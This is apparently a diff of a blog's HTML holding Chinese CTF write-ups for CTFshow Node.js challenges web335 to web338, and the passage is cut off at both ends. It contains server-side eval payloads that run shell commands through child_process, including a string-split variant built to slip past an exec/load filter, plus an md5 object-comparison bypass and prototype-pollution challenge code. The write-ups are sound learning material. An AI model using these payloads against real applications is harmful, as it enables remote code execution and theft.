-?eval&#x3D;var s&#x3D;&#39;global.process.mainModule.constructor._lo&#39;;var b&#x3D;&quot;ad(&#39;child_process&#39;).ex&quot;;var c&#x3D;&quot;ec(%27ls&gt;public&#x2F;1.txt%27);&quot;;eval(s%2Bb%2Bc)%3B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//字符串拼接</span></span><br><span class="line">?<span class="built_in">eval</span>=<span class="keyword">var</span> s=<span class="string">&#x27;global.process.mainModule.constructor._lo&#x27;</span>;<span class="keyword">var</span> b=<span class="string">&quot;ad(&#x27;child_process&#x27;).ex&quot;</span>;<span class="keyword">var</span> c=<span class="string">&quot;ec(%27ls&gt;public/1.txt%27);&quot;</span>;<span class="built_in">eval</span>(s%2Bb%2Bc)%3B</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <h1><span id="web336-有过滤的rce">web336 有过滤的RCE</span></h1><p>继上一题RCE，过滤了<code>exec|load</code>。姿势还是很多d。</p>
-<pre class="line-numbers language-none"><code class="language-none">?eval&#x3D;require( &#39;child_process&#39; ).spawnSync( &#39;ls&#39;, [ &#39;.&#39; ] ).stdout.toString()
-?eval&#x3D;require( &#39;child_process&#39; ).spawnSync( &#39;cat&#39;, [ &#39;f*&#39; ] ).stdout.toString()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Coffeescript"><div class="codebox"><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>( <span class="string">&#x27;child_process&#x27;</span> ).spawnSync( <span class="string">&#x27;ls&#x27;</span>, [ <span class="string">&#x27;.&#x27;</span> ] ).stdout.toString()</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>( <span class="string">&#x27;child_process&#x27;</span> ).spawnSync( <span class="string">&#x27;cat&#x27;</span>, [ <span class="string">&#x27;f*&#x27;</span> ] ).stdout.toString()</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>补充：</p>
 <p><code>__filename</code>：返回当前模块文件被解析过后的绝对路径。</p>
 <p><code>__dirname</code>：返回当前模块文件解析过后所在的文件夹(目录)的绝对路径。</p>
 <h1><span id="web337-js变量">web337 js变量</span></h1><p>这题考察对于 js变量 的理解。<br>js变量分为：值类型(基本类型)、引用数据类型（对象类型）。</p>
 <p>题目源码：</p>
-<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">function</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-  <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span>
-    <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
-    <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token comment">/* GET home page. */</span>
-router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'xxxxxxx'</span><span class="token punctuation">;</span>
-  <span class="token keyword">var</span> a <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">;</span>
-  <span class="token keyword">var</span> b <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>b<span class="token punctuation">;</span>
-  <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-  	res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-  	res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'tql'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span>
-  
-<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Js"><div class="codebox"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>关键代码：</p>
-<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
- 	res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Js"><div class="codebox"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line"> 	res.<span class="title function_">end</span>(flag);</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>payload:</p>
-<pre class="line-numbers language-none"><code class="language-none">a[x]&#x3D;1&amp;b[x]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Stylus"><div class="codebox"><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[x]</span>=<span class="number">1</span>&amp;<span class="selector-tag">b</span><span class="selector-attr">[x]</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>原理：</p>
 <p><code>a[x]=1&amp;b[x]=2</code> 相当于是说，a和b都是 引用数据类型（<strong>对象</strong>类型），那么在<code>a+flag</code>和<code>b+flag</code> 时，他们的结果就会都是<code>[object Object]flag&#123;xxx&#125;</code> ，那么md5值自然就是一样的了。</p>
 <p>若运行如下代码：</p>
-<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//a,b是对象</span>
-a<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string-property property">'x'</span><span class="token operator">:</span><span class="token string">'1'</span><span class="token punctuation">&#125;</span>
-b<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string-property property">'x'</span><span class="token operator">:</span><span class="token string">'2'</span><span class="token punctuation">&#125;</span>
-
-console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token string">"flag&#123;xxx&#125;"</span><span class="token punctuation">)</span>
-console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token string">"flag&#123;xxx&#125;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Js"><div class="codebox"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//a,b是对象</span></span><br><span class="line">a=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">b=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;2&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>两个都会打印出<code>[object Object]flag&#123;xxx&#125;</code>，所以他们的md5也是一样的了。</p>
 <p>为什么传<code>a[0]=1&amp;b[0]=2</code>不行呢，因为当我们这样传的时候相当于创了个<strong>数组</strong>变量<code>a=[1] b=[2]</code></p>
-<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//数组变量</span>
-a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
-b<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
-
-console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token string">"flag&#123;xxx&#125;"</span><span class="token punctuation">)</span>
-console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token string">"flag&#123;xxx&#125;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Js"><div class="codebox"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数组变量</span></span><br><span class="line">a=[<span class="number">1</span>]</span><br><span class="line">b=[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>打印出来的结果是<code>1flag&#123;xxx&#125;</code>和<code>2flag&#123;xxx&#125;</code>，md5就会是不一样的了。</p>
 <h1><span id="web338-原型链污染">web338 原型链污染</span></h1><p>本题考察简单的 <u>原型链污染</u>。</p>
@@ -295,47 +82,11 @@ console<span class="token punctuation">.</span><span class="token function">log<
 </li>
 </ul>
 <p>源码：</p>
-<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//routes/login.js</span>
-<span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token comment">/* GET home page.  */</span>
-router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>
-  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
-  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>
-  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
-  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span><span class="token string">'36dboy'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
-  <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span>
-<span class="token comment">//--------------------------------------------------------------------</span>
-<span class="token comment">//utils/common.js</span>
-module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
-  <span class="token literal-property property">copy</span><span class="token operator">:</span>copy
-<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
-<span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">object1<span class="token punctuation">,</span> object2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> object2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> object2 <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> object1<span class="token punctuation">)</span> 
-        <span class="token punctuation">&#123;</span>
-            <span class="token function">copy</span><span class="token punctuation">(</span>object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
-        <span class="token punctuation">&#125;</span> 
-        <span class="token keyword">else</span> 
-        <span class="token punctuation">&#123;</span>
-            object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Js"><div class="codebox"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//routes/login.js</span></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = 